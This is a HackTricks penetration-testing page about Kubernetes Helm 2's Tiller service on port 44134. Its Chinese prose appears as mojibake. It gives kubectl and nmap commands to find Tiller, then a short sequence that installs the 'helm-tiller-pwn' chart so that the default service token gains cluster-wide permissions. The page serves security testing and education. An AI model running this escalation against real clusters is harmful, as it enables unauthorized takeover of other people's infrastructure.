{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}


# åŸºæœ¬ä¿¡æ¯

Helm æ˜¯ Kubernetes çš„ **åŒ…ç®¡ç†å™¨**ã€‚å®ƒå…è®¸å°† YAML æ–‡ä»¶æ‰“åŒ…å¹¶åœ¨å…¬å…±å’Œç§æœ‰ä»“åº“ä¸­åˆ†å‘ã€‚è¿™äº›åŒ…ç§°ä¸º **Helm Charts**ã€‚**Tiller** æ˜¯é»˜è®¤åœ¨ç«¯å£ 44134 ä¸Šè¿è¡Œçš„ **æœåŠ¡**ï¼Œæä¾›è¯¥æœåŠ¡ã€‚

**é»˜è®¤ç«¯å£ï¼š** 44134
```
PORT      STATE SERVICE VERSION
44134/tcp open  unknown
```
# Enumeration

å¦‚æœæ‚¨å¯ä»¥**æšä¸¾ä¸åŒå‘½åç©ºé—´çš„ pods å’Œ/æˆ–æœåŠ¡**ï¼Œè¯·æšä¸¾å®ƒä»¬å¹¶æœç´¢åç§°ä¸­åŒ…å«**â€œtillerâ€**çš„é¡¹ï¼š
```bash
kubectl get pods | grep -i "tiller"
kubectl get services | grep -i "tiller"
kubectl get pods -n kube-system | grep -i "tiller"
kubectl get services -n kube-system | grep -i "tiller"
kubectl get pods -n <namespace> | grep -i "tiller"
kubectl get services -n <namespace> | grep -i "tiller"
```
ç¤ºä¾‹ï¼š
```bash
kubectl get pods -n kube-system
NAME                                       READY   STATUS             RESTARTS   AGE
kube-scheduler-controlplane                1/1     Running            0          35m
tiller-deploy-56b574c76d-l265z             1/1     Running            0          35m

kubectl get services -n kube-system
NAME            TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)                  AGE
kube-dns        ClusterIP   10.96.0.10     <none>        53/UDP,53/TCP,9153/TCP   35m
tiller-deploy   ClusterIP   10.98.57.159   <none>        44134/TCP                35m
```
æ‚¨è¿˜å¯ä»¥å°è¯•é€šè¿‡æ£€æŸ¥ç«¯å£ 44134 æ¥æŸ¥æ‰¾æ­¤æœåŠ¡æ˜¯å¦æ­£åœ¨è¿è¡Œï¼š
```bash
sudo nmap -sS -p 44134 <IP>
```
ä¸€æ—¦ä½ å‘ç°å®ƒï¼Œä½ å¯ä»¥é€šè¿‡ä¸‹è½½å®¢æˆ·ç«¯ helm åº”ç”¨ç¨‹åºä¸ä¹‹é€šä¿¡ã€‚ä½ å¯ä»¥ä½¿ç”¨åƒ `homebrew` è¿™æ ·çš„å·¥å…·ï¼Œæˆ–è€…æŸ¥çœ‹ [**å®˜æ–¹å‘å¸ƒé¡µé¢**](https://github.com/helm/helm/releases)**.** æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯æˆ–å…¶ä»–é€‰é¡¹ï¼Œè¯·å‚é˜… [å®‰è£…æŒ‡å—](https://v2.helm.sh/docs/using\_helm/#installing-helm)ã€‚

ç„¶åï¼Œä½ å¯ä»¥ **æšä¸¾æœåŠ¡**ï¼š
```
helm --host tiller-deploy.kube-system:44134 version
```
## æƒé™æå‡

é»˜è®¤æƒ…å†µä¸‹ï¼Œ**Helm2** å®‰è£…åœ¨ **kube-system** å‘½åç©ºé—´ä¸­ï¼Œå…·æœ‰ **é«˜æƒé™**ï¼Œå› æ­¤å¦‚æœæ‚¨æ‰¾åˆ°è¯¥æœåŠ¡å¹¶ä¸”å¯ä»¥è®¿é—®å®ƒï¼Œè¿™å¯èƒ½å…è®¸æ‚¨ **æå‡æƒé™**ã€‚

æ‚¨éœ€è¦åšçš„å°±æ˜¯å®‰è£…ä¸€ä¸ªè¿™æ ·çš„åŒ…ï¼š[**https://github.com/Ruil1n/helm-tiller-pwn**](https://github.com/Ruil1n/helm-tiller-pwn)ï¼Œè¿™å°†ä½¿ **é»˜è®¤æœåŠ¡ä»¤ç‰Œè®¿é—®æ•´ä¸ªé›†ç¾¤ä¸­çš„æ‰€æœ‰å†…å®¹ã€‚**
```
git clone https://github.com/Ruil1n/helm-tiller-pwn
helm --host tiller-deploy.kube-system:44134 install --name pwnchart helm-tiller-pwn
/pwnchart
```
åœ¨ [http://rui0.cn/archives/1573](http://rui0.cn/archives/1573) ä¸­ä½ å¯ä»¥æ‰¾åˆ° **æ”»å‡»çš„è§£é‡Š**ï¼Œä½†åŸºæœ¬ä¸Šï¼Œå¦‚æœä½ é˜…è¯»æ–‡ä»¶ [**clusterrole.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrole.yaml) å’Œ [**clusterrolebinding.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrolebinding.yaml) åœ¨ _helm-tiller-pwn/pwnchart/templates/_ ä¸­ï¼Œä½ å¯ä»¥çœ‹åˆ° **æ‰€æœ‰æƒé™éƒ½è¢«èµ‹äºˆäº†é»˜è®¤ä»¤ç‰Œ**ã€‚

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
